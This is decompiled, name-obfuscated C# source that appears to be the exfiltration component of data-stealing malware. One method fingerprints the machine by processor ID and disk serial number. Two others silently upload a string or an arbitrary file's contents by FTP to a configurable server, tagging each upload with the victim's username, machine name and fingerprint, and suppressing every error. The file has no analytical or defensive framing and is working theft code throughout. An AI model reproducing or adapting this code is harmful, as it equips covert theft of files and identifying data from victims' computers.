using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;

namespace nLpTFjJRwUBp;

internal sealed class HEBapABdzYbQ
{
	public static string YXfnaAHlzuBRj()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		//IL_0036: Expected O, but got Unknown
		//IL_0077: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		string text = string.Empty;
		try
		{
			ManagementClass val = new ManagementClass("win32_processor");
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					text = ((ManagementBaseObject)val2).get_Properties().get_Item("processorID").get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text2 = "C";
			ManagementObject val3 = new ManagementObject("win32_logicaldisk.deviceid=\"" + text2 + ":\"");
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item("VolumeSerialNumber").ToString();
		}
		catch (Exception)
		{
			return string.IsNullOrEmpty(text) ? "" : text;
		}
	}

	public static void GPORjTPuBUAh(string zIengRBuvPMfBpD = "URL", string WjLbiNWsQksgV = "USERNAME", string NNsiCFjFPefTa = "ACCESO", string jkkyKjbQzs = "")
	{
		try
		{
			string text = YXfnaAHlzuBRj();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(zIengRBuvPMfBpD + "UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + text + ".txt");
			ftpWebRequest.Method = "STOR";
			ftpWebRequest.Credentials = new NetworkCredential(WjLbiNWsQksgV, NNsiCFjFPefTa);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(jkkyKjbQzs);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void bTXRLTCiyGQxgkc(string NFLFZdLCESkHWd = "URL", string hJzvNKNOBUrxBWM = "USERNAME", string QiDluzrCEWyy = "ACCESO", string vPtoyejKrXaH = "")
	{
		try
		{
			string text = YXfnaAHlzuBRj();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(NFLFZdLCESkHWd + "UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + text + "_" + Path.GetFileName(vPtoyejKrXaH));
			ftpWebRequest.Method = "STOR";
			ftpWebRequest.Credentials = new NetworkCredential(hJzvNKNOBUrxBWM, QiDluzrCEWyy);
			byte[] array = File.ReadAllBytes(vPtoyejKrXaH);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}
}
